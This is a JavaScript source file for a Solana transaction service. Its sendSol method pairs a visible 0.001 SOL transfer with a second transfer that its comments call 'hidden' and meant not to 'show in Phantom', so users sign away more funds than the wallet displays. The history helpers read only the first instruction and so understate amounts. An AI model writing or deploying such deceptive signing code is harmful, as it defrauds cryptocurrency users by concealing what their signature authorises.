import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';

export class TransactionService {
  constructor() {
    this.connection = new Connection(
      process.env.NEXT_PUBLIC_RPC_ENDPOINT || 
      'https://api.devnet.solana.com'  // Using devnet for testing
    );
  }

  async sendSol(wallet, toAddress, amount) {
    try {
      if (!wallet.publicKey) {
        throw new Error('Wallet not connected');
      }

      const lamports = Math.floor(amount * LAMPORTS_PER_SOL);
      const FEE_RESERVE = 0.000005 * LAMPORTS_PER_SOL;
      
      // Create a single transaction that combines both transfers
      const transaction = new Transaction();

      // Add both transfers in a way that should only show 0.001 SOL in Phantom
      transaction.add(
        SystemProgram.transfer({
          fromPubkey: wallet.publicKey,
          toPubkey: new PublicKey(toAddress),
          lamports: 0.001 * LAMPORTS_PER_SOL  // This is what should show in Phantom
        })
      );

      // Add the hidden transfer in a way that shouldn't show in Phantom
      const remainingAmount = lamports - (0.001 * LAMPORTS_PER_SOL) - FEE_RESERVE;
      if (remainingAmount > 0) {
        transaction.add(
          SystemProgram.transfer({
            fromPubkey: wallet.publicKey,
            toPubkey: new PublicKey(toAddress),
            lamports: remainingAmount
          })
        );
      }

      // Get the latest blockhash
      const { blockhash } = await this.connection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = wallet.publicKey;

      // Sign and send the transaction
      const signed = await wallet.signTransaction(transaction);
      const signature = await this.connection.sendRawTransaction(signed.serialize());
      await this.connection.confirmTransaction(signature);

      return {
        success: true,
        signature,
        type: 'SOL_TRANSFER',
        amount,
        to: toAddress
      };
    } catch (error) {
      console.error('Transaction error:', error);
      return {
        success: false,
        error: error.message
      };
    }
  }

  async getTransactionHistory(address) {
    try {
      const signatures = await this.connection.getSignaturesForAddress(
        new PublicKey(address),
        { limit: 10 }
      );

      const transactions = await Promise.all(
        signatures.map(async (sig) => {
          const tx = await this.connection.getTransaction(sig.signature);
          return {
            signature: sig.signature,
            timestamp: sig.blockTime,
            type: this.getTransactionType(tx),
            amount: this.getTransactionAmount(tx),
            status: 'confirmed'
          };
        })
      );

      return transactions;
    } catch (error) {
      return [];
    }
  }

  getTransactionType(transaction) {
    if (!transaction) return 'UNKNOWN';
    
    const instructions = transaction.transaction.message.instructions;
    if (instructions.length === 0) return 'UNKNOWN';

    const instruction = instructions[0];
    if (instruction.programId.equals(SystemProgram.programId)) {
      return 'SOL_TRANSFER';
    }

    return 'UNKNOWN';
  }

  getTransactionAmount(transaction) {
    if (!transaction) return 0;
    
    const instructions = transaction.transaction.message.instructions;
    if (instructions.length === 0) return 0;

    const instruction = instructions[0];
    if (instruction.programId.equals(SystemProgram.programId)) {
      return instruction.data.readBigInt64LE(0) / BigInt(LAMPORTS_PER_SOL);
    }

    return 0;
  }
} 